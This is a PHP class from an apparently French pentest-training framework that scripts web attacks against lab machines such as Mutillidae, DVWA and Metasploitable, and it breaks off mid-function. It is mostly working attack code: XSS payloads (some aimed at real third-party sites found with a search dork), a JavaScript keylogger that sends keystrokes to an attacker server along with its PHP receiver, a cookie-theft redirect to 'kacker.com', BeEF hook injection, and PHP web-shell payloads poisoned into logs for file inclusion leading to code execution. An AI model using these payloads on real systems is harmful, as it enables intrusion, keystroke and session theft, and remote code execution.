<?php

class poc4web extends poc4service{
    
    /*
    https://www.hackingarticles.in/web-application-pentest-lab-setup-using-docker/
    https://www.hackingarticles.in/configure-web-application-penetration-testing-lab/
     */
    
    public function __construct() {
        parent::__construct();
        
    }
    

    
    
    public function poc4web4rfi(){
        $msf = "10.60.10.130";

        $owasp = "10.60.10.129";
        
        $url = "http://$owasp:80/mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $ip = "$owasp";
        $OS = "linux";
        $eth = $this->ip4eth4target($ip);
        $domain = "hack.vlan";
        $url_fi = new URL($eth,$domain,$url);
        $url_fi->poc($this->flag_poc);
        $url_fi->url4pentest();
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi4pentest($OS);
    }
    
    
    public function poc4web4xss(){
        // ############################# XSS #################################################
        // Session Hijacking Tools :
        // Hunt
        // Paros
        
        // unlike BeeF, XeeK, XSSShell
        /*
         * ssTitre("JAVA Vulnerabilities history");
         * net("https://www.recordedfuture.com/zero-day-patch/");
         */
        
        /*
         * Client Side
         * There are a good number of browser exploits within Metasploit. The ease of starting a quick
         * server with the content needed to exploit the remote machine is as simple is this:
         * msf > use auxiliary/server/browser_autopwn
         * msf auxiliary(browser_autopwn) > set SRVHOST 192.168.1.146
         * msf auxiliary(browser_autopwn) > set SRVPORT 8080
         * 27
         * msf auxiliary(browser_autopwn) > set LHOST 192.168.1.146
         * msf auxiliary(browser_autopwn) > set LPORT 4567
         * msf auxiliary(browser_autopwn) > run
         *
         * rohff@labs:/opt/cuckoo/utils$ cd /opt/cuckoo/utils/; python submit.py --platform windows --machine cuckoo1 --url <URL>
         * + --package doc <file.doc> + --package pdf <file.pdf> + --package xsl <file.xsl> (pour les vers)
         * http://docs.cuckoosandbox.org/en/latest/usage/packages/
         * -> prendre une URL -> http://www.malwareblacklist.com/showMDL.php
         */
        /*
         * Firefox :
         * about:
         * about:plugins
         * // python, PHP, openssl, C, flash ...etc
         */
        $this->chapitre("Attaque Cote Clients");
        $this->titre("XSS");
        $this->titre("Attaques XSS");
        $this->net("http://malc0de.com/tools/beautify/");
        $this->net("http://jsunpack.jeek.org/dec/go/");
        $this->net("http://www.javascriptbeautifier.com/");
        $this->net("http://jsbeautifier.org/");
        $this->net("http://vitzo.com/en/tools/javascript/javascript-beautifier");
        $this->net("http://www.asciitohex.com/");
        $this->img("$this->dir_img/web/vulnérabilités_ciblées_par_ces_kits_d__exploitation.png");
        $this->note("les site a grand traffic qui ont le plus peur des attack xss parceque ya + internaute + de degats + echo + dommage pour entreprise exp: facebook, site administratif mairie, ministere, banques ...etc");
        $this->net("www.xssed.com/pagerank");
        $this->net("http://xssed.org/archive/special=1");
        $this->pause();
        $this->article("ADD","<script>alert('salut')</script>");
        $this->article("ADD","<script>alert(String.fromCharCode(88,83,83))</script>");
        $this->article("ADD","<iframe onload=alert('XSS 2')></iframe>");
        $this->article("ADD","<style>@import javascript:alert(\"XSS 3\")';</style>");
        $this->article("ADD","<img src=foo.png onerror=alert(/XSS 4/) onmouseover=alert('XSS 5') />");
        $this->article("Replace <body>","<body onmouseover=alert('Wufff!')>");
        $this->article("ADD","<script>alert(document.cookie)</script>");
        $this->net("http://www.w3schools.com/html/tryit.asp?filename=tryhtml_intro");
        $this->article("OWASP:login/pass","admin/password");
        $this->net("http://$this->owasp/dvwa/vulnerabilities/xss_r/");
        $this->pause();
        $this->ssTitre("<script>alert('salut')</script>");
        $this->net("http://sales.buysmrt.com/s/%3Cscript%3Ealert%28%27salut%27%29%3C/script%3E");
        $this->pause();
        $this->ssTitre("<script>alert(String.fromCharCode(88,83,83))</script>");
        $this->net("http://sales.buysmrt.com/s/%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E");
        $this->pause();
        $this->ssTitre("<iframe onload=alert('XSS')></iframe>");
        $this->net("http://sales.buysmrt.com/s/%3Ciframe%20onload=alert%28%27XSS%27%29%3E%3C/iframe%3E");
        $this->pause();
        
        $this->titre("Exemple d'exploitation d'une faille XSS");
        
        
        $this->ssTitre("keylogger Javascript");
        
        $Keylogger_js = <<<KYLG
		<script language="javascript">
		var keys='';
		document.onkeypress = function(e) {
		get = window.event?event:e;
		key = get.keyCode?get.keyCode:get.charCode;
		key = String.fromCharCode(key);
		keys+=key;
		}
		window.setInterval(function(){
				new Image().src = 'http://$this->prof/keylogger.php?c='+keys;
				keys = '';
				}, 1000);
		</script>
KYLG;
        $this->requette("echo \"$Keylogger_js\" | sudo  tee /var/www/html/keylogger.js > /dev/null ");
        $this->requette("echo '$this->root_passwd' | sudo -S chown www-data:www-data /var/www/html/keylogger.js");
        $this->requette("cat /var/www/html/keylogger.js");
        $Keylogger_php = <<<KLG
<?php
		echo \"Execution du fichier \\\n\";
		if(!empty(\\\$_GET['c'])) {
		echo \"je vais copier \\\$_GET['c'] \\\n\";
		\\\$f=fopen(\"log.txt\",\"a+\");
		fwrite(\\\$f,\\\$_GET['c']);
		fclose(\\\$f);
		}
?>
KLG;
        $this->pause ();
        $this->requette("echo \"$Keylogger_php\" | sudo tee /var/www/html/keylogger.php > /dev/null");
        $this->requette("echo '$this->root_passwd' | sudo -S chown www-data:www-data /var/www/html/keylogger.php");
        $this->requette("cat /var/www/html/keylogger.php");
        $this->article("exemple", "Ici, le programme enregistre tout ce qui est saisi au clavier (fonction onkeypress) dans une variable temporaire appelee key.
		A cote de cela, la fonction setInterval attend une seconde avant de transferer les donnees vers un serveur distant  (attaquant).
Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pour fonction la reception des donnees envoyees par le keylogger.
		");
        $this->requette("echo '' | sudo tee /var/www/html/log.txt > /dev/null");
        $this->requette("echo '$this->root_passwd' | sudo -S chmod 777 /var/www/html/log.txt");
        $this->requette("echo '$this->root_passwd' | sudo -S chown www-data:www-data /var/www/html/log.txt");
        $this->cmd("localhost", "watch tail /var/www/html/log.txt");
        $this->article("ADD Forum", "<script src=http://$this->prof/keylogger.js></script>");
        $this->pause ();
        
        $this->todo("trouver des sites vulnerables XSS");
        $this->net("inurl:.com/search.asp");
        $this->article("TEST With","<script>alert('salut')</script>");
        $this->article("ADD","<script>alert(String.fromCharCode(88,83,83))</script>");
        $this->article("TEST","%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%73%61%6c%75%74%27%29%3c%2f%73%63%72%69%70%74%3e");
        $this->requette("cat $this->dir_tools/web/xss.dork");
        $this->net("http://www.aerobertics.be/products.php?searchString=%3Cscript%3Ealert%28%27salut%27%29%3C/script%3E");
        $this->net("http://www.jerusalemeverything.com/search.php?searchstring=%3Cscript%3Ealert%28%27salut%27%29%3C/script%3E");
        $this->net("http://www.psycline.org/journals/publishersearch.php?searchstring=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E");
        $this->net("http://www.speech.hku.hk/dyslexia/forum.php?msg=forgetpw&errormessage=&errormessage=E-mail%20address%20[%3Cscript%3Ealert%28%27salut%27%29%3C%2fscript%3E]%20is%20NOT%20Exist!%20Please%20input%20another%20one.%3Cbr%3E");
        
        
        $this->gras("\t<script>alert(document.cookie)</script>\n");
        $this->net("http://$this->owasp/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E#");
        $this->pause ();
        $this->cmd("localhost", "curl --cookie \"security=low; PHPSESSID=<ID Session>\" --location \"http://$this->owasp/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#\"");
        $this->pause ();
        
        $this->ssTitre("Exemple Vol Cookies");
        $this->gras("<script>document.location='http://kacker.com/cgi-bin/script.cgi?'+document.cookie</script>\n");
        $this->pause ();
        
        /*
        
        *
        * # Disable Rubygems' local documentation generation for each installed gem
        * echo "gem: --no-document" > ~/.gemrc
        *
        * gem install bundler
        *
        */
        $this->titre("BEeF");
        
        
        
        if (!file_exists("/opt/beef/beef")) $this->install_web_beef();
        
        $this->article("ADD Forum", "<script src=http://$this->prof:3000/hook.js></script>");
        $this->net("http://$this->owasp/mutillidae/index.php?page=add-to-your-blog.php");
        $this->pause ();
        $this->ssTitre("Control Zombies");
        $this->article("Login", "beef");
        $this->article("PASS", "beef");
        $this->net("http://$this->prof:3000/ui/panel");
        $this->pause ();
        
        $this->article("msf>", "beef_connect http://127.0.0.1:3000 beef beef");
        $this->pause ();
        $this->pause ();
        $query = "echo \"db_status\nload /opt/metasploit/apps/pro/msf3/plugins/beef.rb\nbeef_help\nbeef_connect\nbeef_online\nhelp beef_target\" > $this->dir_tmp/beef.rc; cat $this->dir_tmp/beef.rc";
        $this->requette($query);
        $this->cmd("localhost", " msfconsole -q -r $this->dir_tmp/beef.rc -y /opt/metasploit/config/database.yml");
        $this->gras("\tbeef_target -e 0 19 -> execute module 19 sur la cible Numero 0\n");
        $this->gras("\tbeef_target -r 0 19 -> reponse module 19 sur la cible Numero 0\n");
        $this->pause ();
        
        $this->ssTitre("Utilisation des Navigateurs");
        $this->net("http://getclicky.com/marketshare/global/web-browsers/");
        $this->net("http://en.wikipedia.org/wiki/Usage_share_of_web_browsers");
        $this->pause ();
        $this->article("Resume", "Le meilleur moyen pour dissimuler le code JavaScript malveillant consistera, dans un premier temps, a  appeler un fichier distant :\n\t<script language=\"javascript\" src=\"http://$this->prof/javascript_malware.js\"></script>");
        $this->pause ();
        $this->ssTitre("Bypassing non-recursive filtering");
        $this->article("Encode", "On pourra aller encore plus loin avec une conversion ASCII vers HexadÃ©cimale du code JavaScript :");
        $this->net("http://yehg.net/encoding/");
        $uri_encoded = "";
        $chaine = "<script>alert('salut')</script>";
        for($i = 0; $i < strlen($chaine); $i ++)
            $uri_encoded .= "%" . dechex(ord($chaine [$i]));
            echo $uri_encoded . "\n";
            $this->article("Xss Vuln", "<script language='javascript'>document.write(unescape('3c%73%63%72%69%70%74%20%6c%61%6e%67%75%61%67%65%3d%22%6a%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%68%61%63%6b%2e%63%6f%6d%2f%6a%61%76%61%73%63%72%69%70%74%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e'))</script>");
            $this->article("filtre <script>", "<scr<script>ipt>alert(document.cookie)</script>");
            $this->pause ();
            
            $this->net("http://www.mozilla.org/fr/plugincheck/");
            $this->pause ();
            $this->ssTitre("differents endroits pour faire executer du code javascript");
            $this->net ("http://htmlpurifier.org/live/smoketests/xssAttacks.php");
            
            $this->notify("END XSS");
    }

    public function poc4web2shell8param2rce(){ // OK Owasp,xvwa
        $this->ssTitre(__FUNCTION__);
        $xvwa = "10.60.10.128";
        $this->start("Web Vulnerabilities", "");
        $this->flag_poc = TRUE ;
        $this->flag_poc = FALSE ;
        //$uri = "mutillidae/index.php?target_host=prof.hack.vlan&page=dns-lookup.php&dns-lookup-php-submit-button=Lookup+DNS";
        //$url = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        $uri = "xvwa/vulnerabilities/cmdi/index.php?target=10.60.10.1";
        
        $url = "http://$xvwa:80/$uri";
        $eth = $this->ip4eth4target($xvwa);
        $domain = "hack.vlan";
        $OS = "linux";
        //$url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
        $url_ce = new PARAM($eth,$domain,$url,"target","10.60.10.1");
        $url_ce->poc($this->flag_poc);
        $url_ce->ce2shell8param2rce($OS);
    }
    
    public function poc4web2shell8param2rfi(){ // OK Owasp
        $this->ssTitre(__FUNCTION__);
        $owasp = "10.60.10.129";
        $this->start("Web Vulnerabilities", "");
        $this->flag_poc = TRUE ;
        $this->flag_poc = FALSE ;
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
         
        $url = "http://$owasp:80/$uri";
        $eth = $this->ip4eth4target($owasp);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2rfi($cmd, $filter);
    }
    
    public function poc4web2shell8param2lfi2log4webserver(){ // OK msf
        $this->ssTitre(__FUNCTION__);
        $this->flag_poc = TRUE ;
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin"; 
        $user2pass = "msfadmin"; 
        $file_log = "/var/log/error.log";
        $command = "grep -ni Errorlog /etc/apache2/sites-available/default";        
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -5 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -5 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4webserver($cmd, $filter);$this->pause();
    }
    
    
    public function poc4web2shell8param2lfi2log4ssh(){ // OK msf
        $this->ssTitre(__FUNCTION__);
        
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/log/auth.log";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4ssh($cmd, $filter);$this->pause();
    }
    
    
    public function poc4web2shell8param2lfi2log(){ //
        $this->ssTitre(__FUNCTION__);
        $query = "for i in $(locate .log | grep -v '.gz' | grep '.log$'); do ls -al \$i;done " ;
        $this->requette($query);
        $ip = "";
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        
        $this->ssh($ip, $port,$user2name, $user2pass,$query);
        $this->pause();
        
        
        
        $this->poc4web2shell8param2lfi2log4smtp();$this->pause(); // OK
        $this->poc4web2shell8param2lfi2log4ssh();$this->pause();    // OK 
        $this->poc4web2shell8param2lfi2log4ftp();$this->pause();    // OK
        $this->poc4web2shell8param2lfi2log4webserver();$this->pause(); // OK
        $this->poc4web2shell8param2lfi2log4useragent();$this->pause(); // OK         
        
        $this->poc4web2shell8param2lfi2log4mysql();$this->pause();    // Later
        $this->poc4web2shell8param2lfi2log4mongodb();$this->pause(); // Later
        $this->poc4web2shell8param2lfi2log4postgresql();$this->pause(); // Later
        $this->poc4web2shell8param2lfi2log4fd();$this->pause(); // No        
        $this->poc4web2shell8param2lfi2log4telnet();$this->pause(); // Later
        $this->poc4web2shell8param2lfi2log4session();$this->pause(); // Later
    }
    
    public function poc4web2shell8param2lfi2log4mysql(){ //
        $this->ssTitre(__FUNCTION__);
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/log/mysql/error.log";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $file_log = "/var/log/syslog";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4db4mysql($cmd, $filter);$this->pause();
    }
    
    public function poc4web2shell8param2lfi2log4mongodb(){ //
        $this->ssTitre(__FUNCTION__);
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/log/mongodb/mongodb.log";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4db4mongodb($cmd, $filter);$this->pause();
    }
    
    public function poc4web2shell8param2lfi2log4postgresql(){ //
        $this->ssTitre(__FUNCTION__);
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/log/postgresql/postgresql-8.3-main.log";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4db4postgresql($cmd, $filter);$this->pause();
    }
    
    public function poc4web2shell8param2lfi2log4session(){ //
        $this->ssTitre(__FUNCTION__);       
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/lib/php5/";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo '$user2pass' | sudo -S su -c \"rm -v $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        $username = "<?system(\$_REQUEST[cmd])?>";
        $username = $this->url2encode($username);
        
        $query = "wget --user-agent=\"$this->user_agent\" --timeout=30 --tries=2 --no-check-certificate \"https://$this->owasp/phpMyAdmin/index.php\" --post-data \"pma_username=$username&pma_password=rohff&server=1&token=1d2d2881cf0fa7415190bced8f8913e1\" -qO-  ";
        
        $this->requette($query);
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "grep \"_REQUEST\[cmd\]\" $file_log* ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4session($cmd, $filter);$this->pause();
    }
    
    public function poc4web2shell8param2lfi2log4fd(){ //
        $this->ssTitre(__FUNCTION__);
        
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        
        $command = "ls -al /proc/";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "ls -al /proc/self/fd";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "pidof apache2";
        $pids_tmp = $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $pids = explode(" ", $pids_tmp);
        
        
        $query = "sshpass -p 'msfadmin' ssh msfadmin@10.60.10.130 -C \"ls -al /proc/\" | awk '{print $8}' | grep -Po \"[0-9]{1,5}\" | sort -u";
        $pids = $this->req_ret_tab($query);
        $pids = array_filter($pids);
        
        $command = "echo $$";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        //$url_fi->fi2log4fd($cmd, $filter);$this->pause();
        
        $uri_4 = "<?system(\$_REQUEST[cmd])?>";
        $url_fi->url2check($this->user2agent,"$url_fi->http_type://$url_fi->vhost:$url_fi->port/$uri_4"," > /dev/null");
        
        $uri_encoded = $this->url2encode($uri_4);
        $url_fi->url2check($this->user2agent,"$url_fi->http_type://$url_fi->vhost:$url_fi->port/$uri_encoded"," > /dev/null");
        
        $uri_4 = "<?system(\\\$_REQUEST[cmd])?>";
        $url_fi->url2check($this->user2agent,"$url_fi->http_type://$url_fi->vhost:$url_fi->port/$uri_4"," > /dev/null");
        
        $uri_encoded = $this->url2encode($uri_4);
        $url_fi->url2check($this->user2agent,"$url_fi->http_type://$url_fi->vhost:$url_fi->port/$uri_encoded"," > /dev/null");
        
        
        
        $user2agent = "<?system(\\\$_REQUEST[cmd])?>";
        
   
        //$user2agent = "";
        
        //$tab_log = file("$this->dir_tools/dico/fi_linux_log_fd.dico");
        foreach ($pids as $pid){
            $pid = trim($pid);
            $path_log_pid = "/proc/$pid";
        //for ($i=1;$i<35;$i++){
        
            $this->article("PID", $pid);
            $command = "echo 'msfadmin' | sudo -S su -c \"cat $path_log_pid/cmdline\" ";
            $this->ssh($ip, $port,$user2name, $user2pass,$command);
            $command = "echo 'msfadmin' | sudo -S su -c \"cat $path_log_pid/environ\" ";
            $this->ssh($ip, $port,$user2name, $user2pass,$command);
            $command = "echo 'msfadmin' | sudo -S su -c \"cat $path_log_pid/cwd\" ";
            $this->ssh($ip, $port,$user2name, $user2pass,$command);
            $command = "echo 'msfadmin' | sudo -S su -c \"for i in $(ls $path_log_pid/fd);do cat $path_log_pid/fd/\$i ;done\" ";
            $this->ssh($ip, $port,$user2name, $user2pass,$command);
            //$path_log_fd = "$path_log_pid/$i";
            //$path_log = trim($path_log_fd);
            //if (!empty($path_log)) $url_fi->param2fi($user2agent,$path_log, $cmd, $filter);
      //  }
            echo "\n";
        }
        
    }
    
    public function poc4web2shell8param2lfi2log4ftp(){ // OK
        $this->ssTitre(__FUNCTION__);
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/log/vsftpd.log";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log && chmod 755 $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4ftp($cmd, $filter);$this->pause();
    }
    
    public function poc4web2shell8param2lfi2log4useragent(){ //
        $this->ssTitre(__FUNCTION__);
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        
        $command = "ls -al /proc/";
        //$this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "ls -al /proc/self/environ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "pidof apache2";
       // $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "echo $$";
        //$this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4useragent($cmd, $filter);$this->pause();
        
    }
    
    public function poc4web2shell8param2lfi2log4telnet(){ //
        $this->ssTitre(__FUNCTION__);
    }
    
    public function poc4web2shell8param2lfi2log4smtp(){ // 
        $this->ssTitre(__FUNCTION__);
        
        $uri = "mutillidae/index.php?page=arbitrary-file-inclusion.php";
        
        $url = "http://$this->msf2:80/$uri";
        $eth = $this->ip4eth4target($this->msf2);
        $domain = "hack.vlan";
        $OS = "linux";
        $cmd = "cat /etc/passwd";
        $filter = "| grep -Po \":0:0:root:/root:/bin/\" ";
        
        $ip = $this->msf2;
        $port = 22;
        $user2name = "msfadmin";
        $user2pass = "msfadmin";
        $file_log = "/var/log/mail.log";
        $command = "ls -al $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        
        $command = "echo '$user2pass' | sudo -S su -c \"echo '' > $file_log\" ";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $command = "tail -10 $file_log";
        $this->ssh($ip, $port,$user2name, $user2pass,$command);
        $this->pause();
        
        
        $url_fi = new PARAM($eth,$domain,$url,"page","arbitrary-file-inclusion.php","GET");
        $url_fi->poc($this->flag_poc);
        $url_fi->fi2log4smtp($cmd, $filter);$this->pause();
    }
    
    
    public function poc4web2shell8php2module(){ // 
        $this->ssTitre(__FUNCTION__);
        $owasp = "10.60.10.130";
        $this->flag_poc = TRUE ;
        $this->flag_poc = FALSE ;
        $uri = "mutillidae/index.php?target_host=prof.hack.vlan&page=dns-lookup.php&dns-lookup-php-submit-button=Lookup+DNS";
        $url = "http://$owasp:80/$uri";
        
        $ip = "$owasp";
        $eth = $this->ip4eth4target($ip);
        $domain = "hack.vlan";
        $OS = "linux";
        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
        
        $url_fi->poc($this->flag_poc);
        $url_fi->ce2shell8php2module($OS);
    }
    
    
    public function poc4web2shell8php2expect(){ //  
        $this->ssTitre(__FUNCTION__);
        $owasp = "10.60.10.130";
        $this->flag_poc = TRUE ;
        $this->flag_poc = FALSE ;
        $uri = "mutillidae/index.php?target_host=prof.hack.vlan&page=dns-lookup.php&dns-lookup-php-submit-button=Lookup+DNS";
        $url = "http://$owasp:80/$uri";
        
        $ip = "$owasp";
        $eth = $this->ip4eth4target($ip);
        $domain = "hack.vlan";
        $OS = "linux";
        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
        
        $url_fi->poc($this->flag_poc);
        $url_fi->ce2shell8php2expect($OS);
    }
    
    
    public function poc4web2shell8php2wrapper(){ //
        $this->ssTitre(__FUNCTION__);
        /*
         $this->net("http://$this->msf/mutillidae/.htaccess");
